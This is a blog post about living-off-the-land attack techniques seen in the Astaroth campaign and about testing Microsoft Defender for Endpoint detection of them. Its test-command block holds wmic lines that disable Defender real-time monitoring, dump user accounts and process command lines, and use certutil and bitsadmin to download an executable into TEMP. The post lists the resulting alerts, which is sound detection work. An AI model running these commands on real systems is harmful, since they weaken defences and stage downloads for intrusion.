# LotL techniques with MDE detection - Part 1 
Hello everyone,

For a long time, I have seen Living off the Land (LotL) techniques discussed in Microsoft Security blogs, and recently I have been learning various attack techniques, especially those related to LotL. 
That's why I believe this is a great time to share my learning and detection insights in MDE through this blog.

### What is living off the land ?

[Microsoft Security blog](https://www.microsoft.com/en-us/security/blog/2018/09/27/out-of-sight-but-not-invisible-defeating-fileless-malware-with-behavior-monitoring-amsi-and-next-gen-av/) explains that “living off the land”, as malware only uses resources already available in the operating system. 

I will show you how LotL techniques were used by attackers, based on past Microsoft Security blogs.


### [Astaroth “living-off-the-land”](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)
This is a somewhat older blog, but I love it because it includes some Windows LotL-related attacks in the attack flow.

1. LNK
2. WMI
3. Bitsadmin
4. Certutil

**LNK** : One common pattern is that an attacker creates a LNK file with a target path that executes a PowerShell command to download and run a malicious script from the internet.

**WMI** : Query the operating system (OS) for specific properties and then formats the output using a custom format file located at a URL.

**Bitsadmin / Certutil** : The commands bitsadmin and certutil can be exploited in cyberattacks, particularly in the context of malware delivery and command-and-control (C2) activities, such as downloading and uploading files.

![image](https://github.com/user-attachments/assets/f3ba69a1-f9bf-4300-9b03-551917f9875f)
> Astaroth “living-off-the-land” attack chain showing multiple legitimate tools abused
---

## Microsoft Defender for Endpoint detection alerts

**Test commands**
```cmd
wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring 1\""
wmic process get caption,executablepath,commandline /format:csv  > %Temp%\commands.csv
wmic useraccount get /ALL /format:csv > %Temp%\UserAccounts.csv
wmic qfe get description,installedOn /format:csv > %Temp%\installedapp.csv
wmic process call create "cmd.exe /c certutil -urlcache -f \"https://aka.ms/ioavtest\" \"%TEMP%\\validatecloud.exe\""
wmic process call create "cmd.exe /c bitsadmin /transfer mydownloadjob /download /priority high \"https://aka.ms/ioavtest\" \"%TEMP%\\validatecloud.exe\""
```

***The pentest device was protected by Defender Antivirus and Microsoft Defender for Endpoint, with Tamper Protection turned on.***

These alerts have been detected by MDE.
- Suspicious Process Discovery
- Suspicious User Account Discovery
- Anomalous account lookups
- Suspicious WMI process creation
- Suspicious file creation by BITSAdmin tool
- Use of living-off-the-land binary to run malicious code
- Suspicious behavior by cmd.exe was observed


![image](https://github.com/user-attachments/assets/0cb41402-9fe2-4c2c-970e-3511bbb0aa1e)

![image](https://github.com/user-attachments/assets/45ad9fcc-1fcb-427b-8876-45b6b74df524)

#### Disclaimer
The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.
